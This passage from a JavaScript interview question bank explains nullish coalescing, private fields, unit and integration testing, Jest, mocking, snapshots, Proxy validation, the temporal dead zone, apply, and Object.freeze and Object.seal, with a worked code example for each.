console.log(delete cache?.entry); // true, no error

// Better than ?. everywhere: validate once at the boundary
function parseOrder(raw) {
  if (!raw?.customer?.name) throw new Error("Invalid order");
  return { customerName: raw.customer.name, items: raw.items ?? [] };
}
console.log(parseOrder({ customer: { name: "Ada" } })); // { customerName: "Ada", items: [] }

=== j139 | E | Nullish (??) vs OR (||)?
**`||` returns the right side when the left side is any falsy value (`false`, `0`, `""`, `NaN`, `null`, `undefined`), while `??` returns it only when the left side is `null` or `undefined`; use `??` for "missing" and `||` for "empty or falsy".**

| Left value | `x \|\| "default"` | `x ?? "default"` |
|---|---|---|
| `null` / `undefined` | `"default"` | `"default"` |
| `0` | `"default"` | `0` |
| `""` | `"default"` | `""` |
| `false` | `"default"` | `false` |
| `NaN` | `"default"` | `NaN` |
| `"Ada"` | `"Ada"` | `"Ada"` |

### When to use which
- **`??`** for configuration and data where falsy values are valid: page size `0`, an empty display name the user chose, a disabled flag `false`, a price of `0`.
- **`||`** when any falsy value should be replaced: show a placeholder when a search box is empty (`query || "Search..."`), fall back from an empty string to a default label.

### Assignment versions
- `x ||= y`: assign if `x` is falsy.
- `x ??= y`: assign if `x` is null or undefined (lazy initialisation).

### Syntax rule
`??` cannot be mixed with `||` or `&&` without parentheses: `a ?? b || c` is a syntax error. Write `(a ?? b) || c`.

### Common bug
`const volume = settings.volume || 50;` turns a deliberate `0` into `50`. Replacing `||` with `??` fixes it.
--- code
const values = [null, undefined, 0, "", false, NaN, "Ada"];
for (const v of values) {
  console.log(String(v).padEnd(9), "||:", String(v || "default").padEnd(8), "??:", v ?? "default");
}

// Real bugs fixed by ??
const settings = { volume: 0, nickname: "", notifications: false };
console.log(settings.volume || 50, settings.volume ?? 50); // 50 0
console.log(settings.notifications || true, settings.notifications ?? true); // true false

// Where || is the right choice: replace empty strings too
const query = "";
console.log(`Results for: ${query || "everything"}`); // Results for: everything

// Assignment operators
const opts = { retries: 0, label: "" };
opts.retries ??= 3; // kept: 0 is a real value
opts.label ||= "Untitled"; // replaced: empty string
console.log(opts); // { retries: 0, label: "Untitled" }

// Mixing needs parentheses
const fallback = (settings.nickname ?? null) || "Anonymous";
console.log(fallback); // Anonymous

=== j140 | M | What are Private Fields?
**Private fields and methods are class members whose names start with `#` (`#balance`, `#validate()`); they can only be accessed from inside the class body, and the language enforces this, unlike the old `_underscore` convention.**

### What can be private
- Instance fields: `#count = 0`.
- Instance methods: `#validate() {}`.
- Getters/setters: `get #total() {}`.
- Static fields and methods: `static #instances = 0`.

### How they behave
- **Truly inaccessible from outside**: `obj.#field` outside the class is a **syntax error**, and they do not appear in `Object.keys`, `JSON.stringify`, `for...in` or even `Reflect.ownKeys`.
- **Per-class, not per-object**: any instance method can read `#field` on *another* instance of the same class (useful for `equals` methods).
- **Brand checks**: `#field in obj` returns whether `obj` was created by this class, a reliable alternative to `instanceof` across realms.
- **Not inherited for access**: subclasses cannot read the parent's private fields directly; expose protected behaviour through methods.
- Accessing a private field on an object that does not have it throws a `TypeError`.

### Why use them
- Protect invariants (a bank balance changes only through `deposit`/`withdraw`).
- Hide implementation details so you can change them without breaking users.
- Avoid name clashes with subclass fields.

### Trade-offs
Proxies and some libraries cannot intercept private fields, and they cannot be accessed for debugging in code (DevTools still shows them). For object-literal-style code, closures provide the same privacy.
--- code
class BankAccount {
  #balance = 0;
  #history = [];
  static #accounts = 0;

  constructor(owner) {
    this.owner = owner;
    BankAccount.#accounts++;
  }

  #record(type, amount) {
    this.#history.push({ type, amount });
  }

  deposit(amount) {
    if (amount <= 0) throw new RangeError("Amount must be positive");
    this.#balance += amount;
    this.#record("deposit", amount);
    return this;
  }

  withdraw(amount) {
    if (amount > this.#balance) throw new Error("Insufficient funds");
    this.#balance -= amount;
    this.#record("withdraw", amount);
    return this;
  }

  get balance() {
    return this.#balance;
  }

  static isAccount(obj) {
    return #balance in obj; // brand check
  }

  static get count() {
    return BankAccount.#accounts;
  }
}

const acc = new BankAccount("Ada").deposit(100).withdraw(30);
console.log(acc.balance, acc.owner); // 70 Ada
console.log(Object.keys(acc), JSON.stringify(acc)); // ["owner"] {"owner":"Ada"}
console.log(acc["#balance"]); // undefined - not a normal property
console.log(BankAccount.isAccount(acc), BankAccount.isAccount({ balance: 70 })); // true false

try {
  acc.withdraw(1000);
} catch (e) {
  console.log(e.message); // Insufficient funds
}
console.log(BankAccount.count); // 1

=== j141 | E | What is Unit Testing?
**Unit testing checks the smallest pieces of code (a function, a hook, a component) in isolation, with fast automated tests that assert specific outputs for given inputs, so you catch regressions early and can refactor safely.**

### Anatomy of a good unit test
- **Arrange**: set up inputs and dependencies.
- **Act**: call the unit.
- **Assert**: check the result or the effect.
- Tests should be **fast, isolated, deterministic** (no real network, clock or randomness) and focused on **behaviour**, not implementation details.

### What to test
- Pure logic: formatting, validation, calculations, reducers, utility functions.
- Edge cases: empty inputs, boundaries, invalid data, errors.
- Components through their public behaviour: what the user sees and can do (React Testing Library encourages this).

### Tools in the JavaScript ecosystem
- **Vitest** (fast, Vite-native, Jest-compatible API) and **Jest** as test runners.
- **Node's built-in test runner** (`node:test`) for simple Node projects.
- **React Testing Library** for components; **MSW** to mock network requests.
- Coverage reports from the runner (aim for meaningful coverage of critical logic, not a percentage target).

### The testing pyramid (or trophy)
Many fast unit tests, fewer integration tests, and a small number of end-to-end tests (Playwright, Cypress). For front-end apps many teams favour integration-style component tests, since they give the most confidence per test.

### Practices
- Write a failing test for each bug before fixing it.
- One reason to fail per test, with descriptive names ("returns 0 for an empty cart").
- Keep functions pure where possible; they are the easiest to unit test.
--- code
// The unit under test: pure, so it's easy to test
export function calculateTotal(items, { taxRate = 0, discount = 0 } = {}) {
  if (!Array.isArray(items)) throw new TypeError("items must be an array");
  const subtotal = items.reduce((sum, i) => sum + i.price * i.qty, 0);
  const discounted = Math.max(0, subtotal - discount);
  return Math.round(discounted * (1 + taxRate) * 100) / 100;
}

// cart.test.js (Vitest; the same API works in Jest)
import { describe, it, expect } from "vitest";

describe("calculateTotal", () => {
  it("returns 0 for an empty cart", () => {
    expect(calculateTotal([])).toBe(0);
  });

  it("multiplies price by quantity and adds tax", () => {
    // Arrange
    const items = [{ price: 10, qty: 2 }, { price: 5, qty: 1 }];
    // Act
    const total = calculateTotal(items, { taxRate: 0.2 });
    // Assert
    expect(total).toBe(30);
  });

  it("never goes below zero with a large discount", () => {
    expect(calculateTotal([{ price: 10, qty: 1 }], { discount: 50 })).toBe(0);
  });

  it("rejects invalid input", () => {
    expect(() => calculateTotal(null)).toThrow(TypeError);
  });
});

=== j142 | M | What is Jest?
**Jest is a popular JavaScript test runner and assertion framework that bundles everything needed to test JavaScript and TypeScript code: test discovery, `describe`/`test` blocks, `expect` matchers, mocking, snapshot testing, coverage and a watch mode.**

### Core features
- **Zero-config start** for many projects, with parallel test execution.
- **Matchers**: `toBe`, `toEqual` (deep equality), `toMatchObject`, `toContain`, `toThrow`, `resolves`/`rejects` for promises, and many more.
- **Mocks**: `jest.fn()` for spies, `jest.mock("module")` to replace whole modules, `jest.spyOn(obj, "method")`.
- **Fake timers**: `jest.useFakeTimers()` and `jest.advanceTimersByTime(ms)` to test debounce, timeouts and intervals instantly.
- **Snapshots**: `toMatchSnapshot()` for serialisable output.
- **Coverage**: `--coverage` uses V8 or Istanbul.
- **Environments**: `node` by default, or `jsdom` to simulate a browser DOM.

### Lifecycle hooks
`beforeAll`, `beforeEach`, `afterEach`, `afterAll` for setup and cleanup.

### Jest vs Vitest
**Vitest** offers a Jest-compatible API, native ES modules and TypeScript, and very fast startup through Vite, so many new projects (especially Vite-based ones) choose it. Jest remains widespread, works well with Next.js through `next/jest`, and has a huge ecosystem. Knowing the shared API covers both.

### Tips
- Use `toEqual` for objects and arrays, `toBe` for primitives and identity.
- Always `await` async assertions (`await expect(p).rejects.toThrow()`).
- Reset mocks between tests (`clearMocks` / `restoreMocks` in config).
--- code
// debounce.js
export function debounce(fn, wait) {
  let t;
  return (...args) => {
    clearTimeout(t);
    t = setTimeout(() => fn(...args), wait);
  };
}

// debounce.test.js (Jest)
import { describe, test, expect, jest, beforeEach, afterEach } from "@jest/globals";
import { debounce } from "./debounce.js";

describe("debounce", () => {
  beforeEach(() => jest.useFakeTimers());
  afterEach(() => jest.useRealTimers());

  test("calls the function once with the latest arguments", () => {
    const spy = jest.fn();
    const debounced = debounce(spy, 300);

    debounced("a");
    debounced("b");
    debounced("c");
    expect(spy).not.toHaveBeenCalled();

    jest.advanceTimersByTime(300); // no real waiting
    expect(spy).toHaveBeenCalledTimes(1);
    expect(spy).toHaveBeenCalledWith("c");
  });

  test("async helpers", async () => {
    const load = jest.fn().mockResolvedValue({ id: 1 });
    await expect(load()).resolves.toEqual({ id: 1 });
    await expect(Promise.reject(new Error("boom"))).rejects.toThrow("boom");
  });
});

=== j143 | M | What is Mocking?
**Mocking replaces a real dependency (an API client, database, timer, module or function) with a controllable fake during a test, so you can test a unit in isolation, simulate edge cases and verify how the dependency was used.**

### Kinds of test doubles
- **Stub**: returns canned data (`getUser` always resolves to Ada).
- **Spy**: records calls and arguments, optionally passing through to the real function.
- **Mock**: a stub or spy with expectations you assert on ("called once with these args").
- **Fake**: a working lightweight implementation (an in-memory database).

### What to mock
- **Network**: prefer **MSW (Mock Service Worker)**, which intercepts requests at the network level, so your real `fetch` code runs. Your tests stay realistic and survive refactors.
- **Time and randomness**: fake timers, a fixed `Date`, seeded random values.
- **Expensive or side-effecting services**: payments, email, analytics.
- **Browser APIs** missing in the test environment (`IntersectionObserver`, `matchMedia`).

### What not to mock
- The unit you are testing.
- Simple pure helpers and your own internal modules; mocking them couples tests to implementation and lets real bugs slip through.
- Too much in general: heavily mocked tests can pass while the real integration is broken. Balance them with integration tests.

### Dependency injection makes mocking easy
If a function receives its dependencies as arguments (or via a context), tests can pass fakes without any mocking framework.

### Hygiene
Reset or restore mocks between tests so state does not leak (`vi.restoreAllMocks()`, `jest.restoreAllMocks()`).
--- code
// Code under test receives its dependencies (easy to mock)
async function sendWelcome(userId, { api, mailer, now = () => new Date() }) {
  const user = await api.getUser(userId);
  if (!user.email) return { sent: false, reason: "no email" };
  await mailer.send({ to: user.email, subject: `Welcome, ${user.name}!`, at: now().toISOString() });
  return { sent: true };
}

// A tiny hand-rolled spy (frameworks give you vi.fn() / jest.fn())
function fn(impl = () => {}) {
  const spy = (...args) => (spy.calls.push(args), impl(...args));
  spy.calls = [];
  return spy;
}

// Stubs and spies for this test
const api = { getUser: fn(async (id) => ({ id, name: "Ada", email: "ada@example.com" })) };
const mailer = { send: fn(async () => {}) };
const fixedNow = () => new Date("2026-01-01T09:00:00Z");

const result = await sendWelcome(7, { api, mailer, now: fixedNow });
console.log(result); // { sent: true }
console.log(api.getUser.calls); // [[7]]
console.log(mailer.send.calls[0][0]); // { to: "ada@example.com", subject: "Welcome, Ada!", at: "2026-01-01T09:00:00.000Z" }

// Simulate an edge case that's hard to reproduce for real
const noEmailApi = { getUser: fn(async (id) => ({ id, name: "Linus", email: null })) };
const mailer2 = { send: fn() };
console.log(await sendWelcome(8, { api: noEmailApi, mailer: mailer2 }), mailer2.send.calls.length); // { sent: false, reason: "no email" } 0

=== j144 | M | What is Snapshot Testing?
**Snapshot testing saves the serialised output of something (rendered component markup, a data structure, an error message) to a file on the first run, and on later runs fails if the output differs, so unexpected changes are caught and reviewed.**

### How it works
1. `expect(value).toMatchSnapshot()` writes a `.snap` file the first time.
2. Later runs compare the new output with the stored snapshot.
3. If the change is intended, update it (`-u` / `--update`) and commit the new snapshot; if not, you found a regression.
4. **Inline snapshots** (`toMatchInlineSnapshot()`) store the expected value directly in the test file, which keeps small snapshots readable in code review.

### Good uses
- Small, stable outputs: serialised config, generated code, CLI output, error messages, transformed data.
- Catching accidental changes in a component's structure **as a supplement** to behavioural tests.
- Visual regression testing (Playwright `toHaveScreenshot`, Chromatic) is the image-based relative, which is great for design systems.

### Common problems
- **Huge snapshots** that nobody reads, so updates get approved blindly with `-u`.
- **Brittle tests** that fail on harmless markup or class-name changes.
- **False confidence**: a snapshot asserts "same as before", not "correct".
- **Non-deterministic output** (dates, random ids) causes flaky failures. Use fixed values or property matchers (`expect.any(String)`).

### Best practice
Keep snapshots small and focused, prefer explicit assertions for behaviour ("shows an error when the email is invalid"), review snapshot diffs like code, and never update snapshots without reading the diff.
--- code
// format.js
export function formatInvoice({ id, customer, items, issuedAt }) {
  const total = items.reduce((s, i) => s + i.price * i.qty, 0);
  return {
    title: `Invoice #${id} for ${customer}`,
    lines: items.map((i) => `${i.qty} x ${i.name} @ ${i.price.toFixed(2)}`),
    total: total.toFixed(2),
    issuedAt,
  };
}

// format.test.js (Vitest / Jest)
import { test, expect } from "vitest";
import { formatInvoice } from "./format.js";

test("formats an invoice", () => {
  const invoice = formatInvoice({
    id: 42,
    customer: "Ada",
    items: [{ name: "Book", price: 12.5, qty: 2 }],
    issuedAt: new Date().toISOString(), // non-deterministic!
  });

  // Small inline snapshot + property matcher for the changing field
  expect(invoice).toMatchInlineSnapshot(
    { issuedAt: expect.any(String) },
    `
    {
      "issuedAt": Any<String>,
      "lines": [
        "2 x Book @ 12.50",
      ],
      "title": "Invoice #42 for Ada",
      "total": "25.00",
    }
  `
  );
});

=== j145 | M | What is Integration Testing?
**Integration testing checks that several units work correctly together, such as a component with its hooks, state and API layer, or an API route with its database, catching problems that isolated unit tests miss.**

### Where it sits
- **Unit tests**: one piece in isolation, dependencies mocked.
- **Integration tests**: several real pieces together; only the outer edges (network, third-party services) are faked.
- **End-to-end tests**: the whole deployed system through a real browser.

### Front-end integration tests
Render a feature (a form, a page section) with React Testing Library, use real components, state and hooks, mock the **network** with MSW, and interact like a user (`userEvent.type`, `click`). Then assert on what the user sees. These tests give high confidence and survive refactors because they do not depend on internals. This idea is behind the "testing trophy", which puts most effort here.

### Back-end integration tests
Call an API endpoint (supertest, `fetch` against a test server) with a real test database (often in Docker or Testcontainers), and check the response **and** the stored data.

### Making them reliable
- Reset state between tests (fresh database transaction, cleared stores).
- Use realistic test data factories.
- Avoid arbitrary sleeps; wait for UI states (`findBy...`, `waitFor`).
- Keep them reasonably fast so they run on every pull request.

### What they catch
Wrong data shapes passed between layers, broken wiring, incorrect API contracts, state that does not update the UI, and error paths across boundaries.
--- code
// SignupForm.test.jsx - React Testing Library + MSW: real component, real hooks, fake network
import { render, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { http, HttpResponse } from "msw";
import { setupServer } from "msw/node";
import { test, expect, beforeAll, afterAll, afterEach } from "vitest";
import { SignupForm } from "./SignupForm";

const server = setupServer(
  http.post("/api/signup", async ({ request }) => {
    const { email } = await request.json();
    if (email === "taken@example.com") return HttpResponse.json({ error: "Email already in use" }, { status: 409 });
    return HttpResponse.json({ id: 1, email }, { status: 201 });
  })
);
beforeAll(() => server.listen());
afterEach(() => server.resetHandlers());
afterAll(() => server.close());

test("signs the user up and shows a welcome message", async () => {
  const user = userEvent.setup();
  render(<SignupForm />);

  await user.type(screen.getByLabelText(/email/i), "ada@example.com");
  await user.type(screen.getByLabelText(/password/i), "correct horse battery");
  await user.click(screen.getByRole("button", { name: /sign up/i }));

  expect(await screen.findByText(/welcome, ada@example.com/i)).toBeInTheDocument();
});

test("shows the server error when the email is taken", async () => {
  const user = userEvent.setup();
  render(<SignupForm />);
  await user.type(screen.getByLabelText(/email/i), "taken@example.com");
  await user.type(screen.getByLabelText(/password/i), "whatever123");
  await user.click(screen.getByRole("button", { name: /sign up/i }));
  expect(await screen.findByRole("alert")).toHaveTextContent("Email already in use");
});

=== j146 | H | How to use Proxy for validation?
**Wrap an object in a `Proxy` with a `set` trap (and optionally `defineProperty` and `deleteProperty` traps) that checks each write against rules, throwing on invalid values and forwarding valid ones with `Reflect.set`, so the object can never hold invalid data.**

### Design
1. Describe the rules as a **schema**: for each key, a validator function or type/range constraints.
2. In `set(target, key, value, receiver)`:
   - reject unknown keys (optional, to catch typos);
   - run the validator; throw a descriptive `TypeError`/`RangeError` on failure;
   - otherwise `return Reflect.set(target, key, value, receiver)`.
3. Validate the **initial** data too, since the trap only sees writes made through the proxy.
4. Optionally trap `deleteProperty` to protect required fields, and `defineProperty` so `Object.defineProperty` cannot bypass the rules.

### Good uses
- Configuration objects edited at runtime.
- Form or settings models in small apps without a validation library.
- Debug builds that catch invalid state early.
- Enforcing read-only views (`set` always throws).

### Limits
- Only writes **through the proxy** are checked; the original target object can still be modified directly, so keep it private.
- Nested objects need their own proxies (validate recursively).
- For API input and forms, schema libraries like **Zod** or Valibot are usually better: they produce typed results, error lists and work at boundaries rather than on every write.
--- code
function createValidated(schema, initial = {}) {
  const check = (key, value) => {
    const rule = schema[key];
    if (!rule) throw new TypeError(`Unknown field "${String(key)}"`);
    const error = rule(value);
    if (error) throw new TypeError(`Invalid ${String(key)}: ${error}`);
  };

  const target = {};
  for (const [k, v] of Object.entries(initial)) check(k, v); // validate initial data too
  Object.assign(target, initial);

  return new Proxy(target, {
    set(t, key, value, receiver) {
      check(key, value);
      return Reflect.set(t, key, value, receiver);
    },
    defineProperty(t, key, descriptor) {
      if ("value" in descriptor) check(key, descriptor.value); // block defineProperty bypass
      return Reflect.defineProperty(t, key, descriptor);
    },
    deleteProperty(t, key) {
      if (key === "email") throw new TypeError("email is required and cannot be deleted");
      return Reflect.deleteProperty(t, key);
    },
  });
}

const userSchema = {
  name: (v) => (typeof v === "string" && v.trim().length >= 2 ? null : "at least 2 characters"),
  age: (v) => (Number.isInteger(v) && v >= 0 && v <= 150 ? null : "integer between 0 and 150"),
  email: (v) => (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v) ? null : "not a valid email"),
};

const user = createValidated(userSchema, { name: "Ada", age: 36, email: "ada@example.com" });
user.age = 37; // ok
console.log(user.age); // 37

for (const attempt of [() => (user.age = -5), () => (user.email = "nope"), () => (user.agee = 40), () => delete user.email]) {
  try {
    attempt();
  } catch (e) {
    console.log(e.message);
  }
}
// Invalid age: integer between 0 and 150
// Invalid email: not a valid email
// Unknown field "agee"
// email is required and cannot be deleted

=== j147 | M | What is the temporal dead zone (TDZ)?
**The temporal dead zone is the period between the start of a scope and the line where a `let`, `const` or `class` is declared; the binding already exists (it is hoisted) but is uninitialised, so any access during that period throws a `ReferenceError`.**

### Why it exists
With `var`, reading a variable before its declaration silently gives `undefined`, which hides bugs. The TDZ turns these mistakes into immediate, clear errors. It also makes `const` meaningful: a constant can never be observed in an "unassigned" state.

### "Temporal", not positional
The TDZ is about **when** code runs, not where it is written. A function can reference a `let` declared below it, as long as the function is *called* after the declaration has executed.

### Places the TDZ shows up
- Using a variable before its `let`/`const` line in the same scope.
- **Shadowing**: an inner `let x` puts `x` in the TDZ for the whole inner block, so even reading the outer `x` there throws.
- **Default parameters** referring to later parameters: `function f(a = b, b = 1)`.
- **Classes**: using a class before its declaration, and `extends` expressions that reference the class being defined.
- **`typeof`** is not safe here: `typeof x` throws in the TDZ (unlike for undeclared variables).
- **Modules with circular imports**: importing a binding that has not been initialised yet throws.

### Practical advice
Declare variables at the top of their scope or right before first use, avoid relying on hoisting, and lint for `no-use-before-define`.
--- code
// 1. Basic TDZ
try {
  console.log(total);
} catch (e) {
  console.log(e.name); // ReferenceError
}
let total = 10;

// 2. Temporal, not positional: the function runs after the declaration
function showLimit() {
  return limit;
}
const limit = 5;
console.log(showLimit()); // 5

// 3. Shadowing puts the inner name in the TDZ for the whole block
const theme = "dark";
{
  try {
    console.log(theme); // refers to the INNER theme, which is still in the TDZ
  } catch (e) {
    console.log("shadowed:", e.name); // shadowed: ReferenceError
  }
  const theme = "light";
}

// 4. typeof is not safe in the TDZ (but is for undeclared names)
console.log(typeof neverDeclared); // "undefined"
try {
  typeof later;
} catch (e) {
  console.log("typeof:", e.name); // typeof: ReferenceError
}
let later = 1;

// 5. Default parameters are evaluated left to right
function range(start = end - 5, end = 10) {
  return [start, end];
}
try {
  range(undefined, 10); // still throws: `end` is uninitialised while `start`'s default runs
} catch (e) {
  console.log("default param:", e.name); // default param: ReferenceError
}
const range2 = (end = 10, start = end - 5) => [start, end]; // refer only to EARLIER params
console.log(range2()); // [5, 10]

=== j148 | M | What is function.prototype.apply used for?
**`Function.prototype.apply(thisArg, argsArray)` invokes a function with an explicit `this` and an array of arguments; today it is mainly used for forwarding calls in wrappers and decorators, borrowing methods, and inside Proxy traps, since spread syntax replaced its older array-spreading role.**

### Practical uses today
1. **Transparent wrappers and decorators**: logging, timing, memoize, once, retry. `fn.apply(this, args)` forwards both the caller's `this` and every argument, so wrapping a method does not break it.
2. **Borrowing methods** for objects that are not the method's usual type: array-likes, `arguments`, `NodeList` in old browsers.
3. **Monkey-patching safely**: keep the original method and call it with the same context: `original.apply(this, arguments)`. Polyfills and instrumentation code use this.
4. **Proxy `apply` traps**: `apply(target, thisArg, args) { return Reflect.apply(target, thisArg, args); }`.
5. **Calling with a computed argument list** when you also need a specific `this`.

### What it used to be used for
`Math.max.apply(null, arr)` and `Array.prototype.push.apply(a, b)` to spread arrays into arguments. Now write `Math.max(...arr)` and `a.push(...b)`.

### Gotchas
- The argument array can hit engine limits on the number of arguments (around tens to hundreds of thousands).
- Arrow functions ignore `thisArg`.
- If `fn` might have an own `apply` property (rare, e.g. in proxies or mocks), call `Reflect.apply(fn, thisArg, args)` or `Function.prototype.apply.call(fn, thisArg, args)`.
--- code
// 1. Transparent decorator: keeps `this` and all arguments
function timed(fn) {
  return function (...args) {
    const start = performance.now();
    try {
      return fn.apply(this, args);
    } finally {
      console.log(`${fn.name} took ${(performance.now() - start).toFixed(2)}ms`);
    }
  };
}

class Cart {
  items = [3, 4];
  total(multiplier = 1) {
    return this.items.reduce((a, b) => a + b, 0) * multiplier;
  }
}
Cart.prototype.total = timed(Cart.prototype.total); // wrap a method in place
console.log(new Cart().total(2)); // logs the time, then 14 - `this` still works

// 2. Monkey-patching with the original preserved
const originalPush = Array.prototype.push;
const tracked = [];
tracked.push = function (...items) {
  console.log("pushing", items);
  return originalPush.apply(this, items);
};
tracked.push("a", "b");
console.log([...tracked]); // ["a", "b"]

// 3. Borrowing a method for an array-like
function joinArgs() {
  return Array.prototype.join.apply(arguments, [" + "]);
}
console.log(joinArgs(1, 2, 3)); // "1 + 2 + 3"

// 4. Proxy apply trap
const safeDivide = new Proxy((a, b) => a / b, {
  apply(target, thisArg, args) {
    if (args[1] === 0) return NaN;
    return Reflect.apply(target, thisArg, args);
  },
});
console.log(safeDivide(10, 2), safeDivide(1, 0)); // 5 NaN

=== j149 | E | What is the purpose of Object.freeze()?
**`Object.freeze(obj)` makes an object immutable at the top level: no properties can be added, removed or changed, and their attributes cannot be reconfigured; it returns the same object, now frozen.**

### What it blocks
- Adding new properties.
- Deleting properties.
- Changing values of existing data properties.
- Changing property descriptors (making them writable again, for example).
- Changing the object's prototype.

In **strict mode** (modules, classes) these attempts throw a `TypeError`; in sloppy mode they fail silently.

### What it does not do
- **It is shallow**: nested objects and arrays are still mutable unless you freeze them too (a recursive "deep freeze").
- Setters on accessor properties can still run, and objects they reference can change.
- It does not create a copy.
- Frozen `Map`/`Set` objects can still change their entries, because those are stored internally, not as properties.

### Use cases
- Constants and configuration that must not be changed: `const ROLES = Object.freeze({ ADMIN: "admin", USER: "user" })`, an enum-like object.
- Catching accidental mutation of state in development (deep-freeze state in tests or reducers).
- Library defaults that callers must not modify.

### Related
- `Object.isFrozen(obj)` to check.
- `Object.seal` (allows value changes) and `Object.preventExtensions` (only blocks additions).
- In TypeScript, `as const` and `Readonly<T>` give compile-time immutability with zero runtime cost; use `Object.freeze` when you need runtime protection.
--- code
"use strict";

const ROLES = Object.freeze({ ADMIN: "admin", EDITOR: "editor" });

for (const attempt of [
  () => (ROLES.ADMIN = "root"), // change
  () => (ROLES.GUEST = "guest"), // add
  () => delete ROLES.EDITOR, // delete
]) {
  try {
    attempt();
  } catch (e) {
    console.log(e.name); // TypeError (x3) in strict mode
  }
}
console.log(ROLES, Object.isFrozen(ROLES)); // { ADMIN: "admin", EDITOR: "editor" } true

// Shallow: nested objects are still mutable
const config = Object.freeze({ api: { url: "https://api.example.com" }, flags: ["beta"] });
config.api.url = "https://evil.example";
config.flags.push("debug");
console.log(config.api.url, config.flags); // https://evil.example ["beta", "debug"]

// Deep freeze recursively
function deepFreeze(obj) {
  for (const value of Object.values(obj)) {
    if (value && typeof value === "object" && !Object.isFrozen(value)) deepFreeze(value);
  }
  return Object.freeze(obj);
}
const safeConfig = deepFreeze({ api: { url: "https://api.example.com" }, flags: ["beta"] });
try {
  safeConfig.flags.push("debug");
} catch (e) {
  console.log("deep frozen:", e.name); // deep frozen: TypeError
}

=== j150 | M | What is the purpose of Object.seal()?
**`Object.seal(obj)` locks an object's shape: no properties can be added or removed and existing ones cannot be reconfigured, but the values of existing writable properties can still be changed.**

### Freeze vs seal vs preventExtensions
| | Add | Delete | Change values | Reconfigure |
|---|---|---|---|---|
| `Object.preventExtensions` | No | Yes | Yes | Yes |
| `Object.seal` | No | No | **Yes** | No |
| `Object.freeze` | No | No | No | No |

Check with `Object.isExtensible`, `Object.isSealed`, `Object.isFrozen`. Like freeze, seal is **shallow** and returns the same object; in strict mode forbidden operations throw a `TypeError`.

### When seal is useful
- **Fixed-shape objects** whose values change but whose keys must not: a settings object, a form model, a state record. Sealing catches typos like `settings.darkmode = true` (instead of `darkMode`), which would otherwise silently create a new property.
- Protecting an object passed to plugins so they can update known fields but not add or remove fields.
- Engines like objects with stable shapes; sealing documents that intent (though the performance effect is usually negligible).

### In TypeScript
Static types already prevent unknown properties at compile time; `Object.seal` adds the same guarantee at runtime, which matters for data coming from plain JavaScript or untyped boundaries.
--- code
"use strict";

const settings = Object.seal({ theme: "light", fontSize: 14, darkMode: false });

settings.fontSize = 16; // allowed: changing an existing value
settings.darkMode = true; // allowed
console.log(settings); // { theme: "light", fontSize: 16, darkMode: true }

for (const attempt of [
  () => (settings.darkmode = true), // typo would silently create a property without seal
  () => delete settings.theme,
  () => Object.defineProperty(settings, "theme", { enumerable: false }),
]) {
  try {
    attempt();
  } catch (e) {
    console.log(e.name); // TypeError (x3)
  }
}

console.log(Object.isSealed(settings), Object.isFrozen(settings)); // true false

// Comparison with preventExtensions and freeze
const ext = Object.preventExtensions({ a: 1 });
delete ext.a; // allowed with preventExtensions
console.log("a" in ext, Object.isExtensible(ext)); // false false

const frozen = Object.freeze({ a: 1 });
try {
  frozen.a = 2;
} catch (e) {
  console.log("freeze blocks value changes:", e.name); // freeze blocks value changes: TypeError
}
